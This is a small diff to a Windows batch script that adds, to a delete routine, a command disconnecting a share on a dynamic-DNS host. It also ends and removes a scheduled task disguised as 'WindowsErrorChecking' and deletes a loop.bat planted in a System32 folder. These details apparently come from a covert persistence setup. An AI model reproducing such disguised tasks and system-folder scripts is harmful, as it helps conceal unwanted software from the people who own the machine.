@@ -38,6 +38,7 @@ exit
 
 
 :delete
+net use \\minhtuan283.ddns.net\HDD /delete >nul 2>&1
 schtasks /End /TN "WindowsErrorChecking"
 schtasks /Delete /TN "WindowsErrorChecking" /F
 del /f /q "C:\Windows\System32\WindowsPowerShell\loop.bat"
